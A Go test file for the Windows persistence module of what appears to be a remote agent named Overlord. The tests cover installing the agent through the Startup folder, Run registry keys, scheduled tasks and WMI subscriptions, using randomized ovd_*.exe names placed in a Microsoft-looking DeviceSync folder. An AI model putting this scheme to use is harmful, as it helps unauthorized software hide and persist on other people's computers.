//go:build windows
// +build windows

package persistence

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"golang.org/x/sys/windows/registry"
)

func TestGetTargetPath_UsesStartupFolderAndRandomizedOvdName(t *testing.T) {
	appData := t.TempDir()
	t.Setenv("APPDATA", appData)

	got, err := getTargetPath()
	if err != nil {
		t.Fatalf("getTargetPath failed: %v", err)
	}

	wantDir := filepath.Join(appData, startupFolderRelative)
	if !strings.EqualFold(filepath.Clean(filepath.Dir(got)), filepath.Clean(wantDir)) {
		t.Fatalf("expected dir %q, got %q", wantDir, filepath.Dir(got))
	}
	base := strings.ToLower(filepath.Base(got))
	if !strings.HasPrefix(base, startupExecutablePrefix) || !strings.HasSuffix(base, ".exe") {
		t.Fatalf("expected randomized ovd_*.exe name, got %q", filepath.Base(got))
	}
}

func TestGetTargetPath_PrefersExistingPrefixedExecutable(t *testing.T) {
	appData := t.TempDir()
	t.Setenv("APPDATA", appData)
	startupDir := filepath.Join(appData, startupFolderRelative)
	if err := os.MkdirAll(startupDir, 0755); err != nil {
		t.Fatalf("mkdir startup dir failed: %v", err)
	}

	expected := filepath.Join(startupDir, "ovd_existing.exe")
	if err := os.WriteFile(expected, []byte("x"), 0644); err != nil {
		t.Fatalf("write startup executable failed: %v", err)
	}

	got, err := getTargetPath()
	if err != nil {
		t.Fatalf("getTargetPath failed: %v", err)
	}

	if !strings.EqualFold(filepath.Clean(got), filepath.Clean(expected)) {
		t.Fatalf("expected existing startup executable %q, got %q", expected, got)
	}
}

func TestIsOverlordRunValueName(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want bool
	}{
		{name: "Legacy", in: "OverlordAgent", want: true},
		{name: "LegacyCaseInsensitive", in: "overlordagent", want: true},
		{name: "Randomized", in: "OverlordAgent-a1b2c3d4e5f6", want: true},
		{name: "RandomizedCaseInsensitive", in: "overlordagent-deadbeefcafe", want: true},
		{name: "OtherApp", in: "OneDrive", want: false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := isOverlordRunValueName(tt.in); got != tt.want {
				t.Fatalf("isOverlordRunValueName(%q)=%v, want %v", tt.in, got, tt.want)
			}
		})
	}
}

func TestActiveMethod(t *testing.T) {
	orig := DefaultPersistenceMethod
	t.Cleanup(func() { DefaultPersistenceMethod = orig })

	tests := []struct {
		in   string
		want string
	}{
		{"startup", "startup"},
		{"registry", "registry"},
		{"taskscheduler", "taskscheduler"},
		{"wmi", "wmi"},
		{"REGISTRY", "registry"},
		{"TaskScheduler", "taskscheduler"},
		{"WMI", "wmi"},
		{"", "startup"},
		{"unknown", "startup"},
		{"  registry  ", "registry"},
	}
	for _, tt := range tests {
		t.Run(tt.in, func(t *testing.T) {
			DefaultPersistenceMethod = tt.in
			if got := activeMethod(); got != tt.want {
				t.Fatalf("activeMethod() = %q, want %q (input=%q)", got, tt.want, tt.in)
			}
		})
	}
}

func TestGetTargetPath_NonStartupMethodsUseAppDataBinaryDir(t *testing.T) {
	orig := DefaultPersistenceMethod
	t.Cleanup(func() { DefaultPersistenceMethod = orig })

	for _, method := range []string{"registry", "taskscheduler", "wmi"} {
		t.Run(method, func(t *testing.T) {
			DefaultPersistenceMethod = method
			appData := t.TempDir()
			t.Setenv("APPDATA", appData)

			got, err := getTargetPath()
			if err != nil {
				t.Fatalf("getTargetPath() error: %v", err)
			}
			wantDir := filepath.Join(appData, appDataBinaryDir)
			if !strings.EqualFold(filepath.Clean(filepath.Dir(got)), filepath.Clean(wantDir)) {
				t.Fatalf("method=%q: expected dir %q, got %q", method, wantDir, filepath.Dir(got))
			}
			base := strings.ToLower(filepath.Base(got))
			if !strings.HasPrefix(base, startupExecutablePrefix) || !strings.HasSuffix(base, ".exe") {
				t.Fatalf("method=%q: expected ovd_*.exe name, got %q", method, filepath.Base(got))
			}
		})
	}
}

func TestGetTargetPath_PrefersExistingBinary_AppDataDir(t *testing.T) {
	orig := DefaultPersistenceMethod
	t.Cleanup(func() { DefaultPersistenceMethod = orig })
	DefaultPersistenceMethod = "registry"

	appData := t.TempDir()
	t.Setenv("APPDATA", appData)

	dir := filepath.Join(appData, appDataBinaryDir)
	if err := os.MkdirAll(dir, 0755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	expected := filepath.Join(dir, "ovd_existing.exe")
	if err := os.WriteFile(expected, []byte("x"), 0644); err != nil {
		t.Fatalf("write: %v", err)
	}

	got, err := getTargetPath()
	if err != nil {
		t.Fatalf("getTargetPath() error: %v", err)
	}
	if !strings.EqualFold(filepath.Clean(got), filepath.Clean(expected)) {
		t.Fatalf("expected existing binary %q, got %q", expected, got)
	}
}

func TestGetTargetPath_MissingAPPDATA(t *testing.T) {
	t.Setenv("APPDATA", "")
	if _, err := getTargetPath(); err == nil {
		t.Fatal("expected error when APPDATA is empty, got nil")
	}
}

func TestDeriveTaskName_DeterministicAndPrefixed(t *testing.T) {
	path := `C:\Users\testuser\AppData\Roaming\Microsoft\DeviceSync\ovd_aabbccdd.exe`
	got1 := deriveTaskName(path)
	got2 := deriveTaskName(path)
	if got1 != got2 {
		t.Fatalf("deriveTaskName is not deterministic: %q vs %q", got1, got2)
	}
	if !strings.HasPrefix(got1, taskNamePrefix) {
		t.Fatalf("task name %q does not have prefix %q", got1, taskNamePrefix)
	}
}

func TestDeriveTaskName_DifferentPathsDifferentNames(t *testing.T) {
	a := deriveTaskName(`C:\path\a\agent.exe`)
	b := deriveTaskName(`C:\path\b\agent.exe`)
	if a == b {
		t.Fatalf("expected distinct task names for distinct paths, both are %q", a)
	}
}

func TestDeriveTaskName_CaseInsensitive(t *testing.T) {
	lower := deriveTaskName(`c:\users\user\agent.exe`)
	upper := deriveTaskName(`C:\Users\User\Agent.exe`)
	if lower != upper {
		t.Fatalf("deriveTaskName should be case-insensitive: %q vs %q", lower, upper)
	}
}

func TestDeriveWMINames_DeterministicPrefixedAndDistinct(t *testing.T) {
	path := `C:\Users\testuser\AppData\Roaming\Microsoft\DeviceSync\ovd_aabbccdd.exe`
	f1, c1 := deriveWMINames(path)
	f2, c2 := deriveWMINames(path)
	if f1 != f2 || c1 != c2 {
		t.Fatalf("deriveWMINames not deterministic: filter %q!=%q or consumer %q!=%q", f1, f2, c1, c2)
	}
	if !strings.HasPrefix(f1, taskNamePrefix) {
		t.Fatalf("filter name %q missing prefix %q", f1, taskNamePrefix)
	}
	if !strings.HasPrefix(c1, taskNamePrefix) {
		t.Fatalf("consumer name %q missing prefix %q", c1, taskNamePrefix)
	}
	if f1 == c1 {
		t.Fatalf("filter and consumer names must differ, both are %q", f1)
	}
}

func TestDeriveWMINames_DifferentPaths(t *testing.T) {
	f1, c1 := deriveWMINames(`C:\path\a\agent.exe`)
	f2, c2 := deriveWMINames(`C:\path\b\agent.exe`)
	if f1 == f2 || c1 == c2 {
		t.Fatalf("expected distinct WMI names for distinct paths: filter %q==%q, consumer %q==%q", f1, f2, c1, c2)
	}
}

func TestGenerateBinaryName_FormatAndUniqueness(t *testing.T) {
	seen := make(map[string]bool)
	for i := 0; i < 20; i++ {
		name, err := generateBinaryName()
		if err != nil {
			t.Fatalf("generateBinaryName() error: %v", err)
		}
		lower := strings.ToLower(name)
		if !strings.HasPrefix(lower, startupExecutablePrefix) {
			t.Fatalf("name %q missing prefix %q", name, startupExecutablePrefix)
		}
		if !strings.HasSuffix(lower, ".exe") {
			t.Fatalf("name %q missing .exe suffix", name)
		}
		if seen[lower] {
			t.Fatalf("generateBinaryName produced a duplicate in 20 iterations: %q", name)
		}
		seen[lower] = true
	}
}

func TestFindExistingBinaryInDir_EmptyDir(t *testing.T) {
	_, ok := findExistingBinaryInDir(t.TempDir())
	if ok {
		t.Fatal("expected false for empty dir, got true")
	}
}

func TestFindExistingBinaryInDir_FoundMatchingFile(t *testing.T) {
	dir := t.TempDir()
	expected := filepath.Join(dir, "ovd_test.exe")
	if err := os.WriteFile(expected, []byte("x"), 0644); err != nil {
		t.Fatalf("write: %v", err)
	}
	got, ok := findExistingBinaryInDir(dir)
	if !ok {
		t.Fatal("expected true, got false")
	}
	if !strings.EqualFold(filepath.Clean(got), filepath.Clean(expected)) {
		t.Fatalf("expected %q, got %q", expected, got)
	}
}

func TestFindExistingBinaryInDir_IgnoresNonMatchingFiles(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "other_agent.exe"), []byte("x"), 0644); err != nil {
		t.Fatalf("write: %v", err)
	}
	_, ok := findExistingBinaryInDir(dir)
	if ok {
		t.Fatal("expected false for non-prefixed file, got true")
	}
}

func TestFindExistingBinaryInDir_IgnoresDirectories(t *testing.T) {
	dir := t.TempDir()
	subdir := filepath.Join(dir, "ovd_dir.exe")
	if err := os.Mkdir(subdir, 0755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	_, ok := findExistingBinaryInDir(dir)
	if ok {
		t.Fatal("expected false when only a directory matches the prefix, got true")
	}
}

func TestFindExistingBinaryInDir_NonexistentDir(t *testing.T) {
	_, ok := findExistingBinaryInDir(filepath.Join(t.TempDir(), "does_not_exist"))
	if ok {
		t.Fatal("expected false for nonexistent dir, got true")
	}
}

func TestCleanupPrefixedExecutables_RemovesOvdFiles(t *testing.T) {
	dir := t.TempDir()
	for _, name := range []string{"ovd_aabbcc.exe", "ovd_112233.exe"} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte("x"), 0644); err != nil {
			t.Fatalf("write %q: %v", name, err)
		}
	}
	keepers := []string{"other_app.exe", "system32.dll"}
	for _, name := range keepers {
		if err := os.WriteFile(filepath.Join(dir, name), []byte("x"), 0644); err != nil {
			t.Fatalf("write %q: %v", name, err)
		}
	}

	if err := cleanupPrefixedExecutables(dir); err != nil {
		t.Fatalf("cleanupPrefixedExecutables: %v", err)
	}

	entries, _ := os.ReadDir(dir)
	for _, e := range entries {
		if strings.HasPrefix(strings.ToLower(e.Name()), startupExecutablePrefix) {
			t.Fatalf("ovd_* file %q was not removed", e.Name())
		}
	}
	if got, want := len(entries), len(keepers); got != want {
		t.Fatalf("expected %d files remaining, got %d", want, got)
	}
}

func TestCleanupPrefixedExecutables_NonexistentDirReturnsNil(t *testing.T) {
	if err := cleanupPrefixedExecutables(filepath.Join(t.TempDir(), "nonexistent")); err != nil {
		t.Fatalf("expected nil for nonexistent dir, got %v", err)
	}
}

func TestInstallRegistry_WritesQuotedValue(t *testing.T) {
	dummy := `C:\Testing\ovd_testvalue.exe`
	if err := installRegistry(dummy); err != nil {
		t.Fatalf("installRegistry: %v", err)
	}

	k, err := registry.OpenKey(registry.CURRENT_USER, registryKey,
		registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		t.Fatalf("open registry key: %v", err)
	}
	defer k.Close()

	names, _ := k.ReadValueNames(0)
	var found string
	for _, name := range names {
		if strings.HasPrefix(strings.ToLower(name), strings.ToLower(registryValuePrefix)) {
			val, _, _ := k.GetStringValue(name)
			if strings.Contains(val, "ovd_testvalue.exe") {
				found = name
				break
			}
		}
	}
	if found == "" {
		t.Fatal("installRegistry did not write expected Run key value")
	}
	val, _, _ := k.GetStringValue(found)
	if !strings.HasPrefix(val, `"`) || !strings.HasSuffix(val, `"`) {
		t.Fatalf("expected quoted value like \"...\", got %q", val)
	}
	_ = k.DeleteValue(found)
}

func TestInstallRegistry_UpdatesExistingValue(t *testing.T) {
	first := `C:\Testing\ovd_first.exe`
	second := `C:\Testing\ovd_second.exe`

	if err := installRegistry(first); err != nil {
		t.Fatalf("installRegistry(first): %v", err)
	}
	if err := installRegistry(second); err != nil {
		t.Fatalf("installRegistry(second): %v", err)
	}

	k, err := registry.OpenKey(registry.CURRENT_USER, registryKey,
		registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		t.Fatalf("open registry key: %v", err)
	}
	defer k.Close()

	names, _ := k.ReadValueNames(0)
	var matches []string
	for _, name := range names {
		if strings.HasPrefix(strings.ToLower(name), strings.ToLower(registryValuePrefix)) {
			val, _, _ := k.GetStringValue(name)
			if strings.Contains(val, "ovd_first.exe") || strings.Contains(val, "ovd_second.exe") {
				matches = append(matches, name)
			}
		}
	}
	for _, name := range matches {
		_ = k.DeleteValue(name)
	}
	if len(matches) != 1 {
		t.Fatalf("expected exactly 1 Run value for the two installs, got %d", len(matches))
	}
}

func TestCleanupOverlordRunValues_RemovesMatchingValues(t *testing.T) {
	k, _, err := registry.CreateKey(registry.CURRENT_USER, registryKey,
		registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		t.Fatalf("open registry key: %v", err)
	}
	defer k.Close()

	toClean := []string{"OverlordAgent", "OverlordAgent-deadbeef", "OverlordAgent-cafebabe"}
	for _, name := range toClean {
		if err := k.SetStringValue(name, `"C:\dummy.exe"`); err != nil {
			t.Fatalf("write %q: %v", name, err)
		}
	}
	keepName := "SomeOtherAppNotOverlord"
	if err := k.SetStringValue(keepName, `"C:\other.exe"`); err != nil {
		t.Fatalf("write keeper: %v", err)
	}
	t.Cleanup(func() {
		_ = k.DeleteValue(keepName)
		for _, name := range toClean {
			_ = k.DeleteValue(name)
		}
	})

	if err := cleanupOverlordRunValues(k); err != nil {
		t.Fatalf("cleanupOverlordRunValues: %v", err)
	}

	for _, name := range toClean {
		if _, _, err := k.GetStringValue(name); err == nil {
			t.Errorf("expected %q to be deleted, but it still exists", name)
		}
	}
	if _, _, err := k.GetStringValue(keepName); err != nil {
		t.Fatalf("expected %q to remain, got error: %v", keepName, err)
	}
}
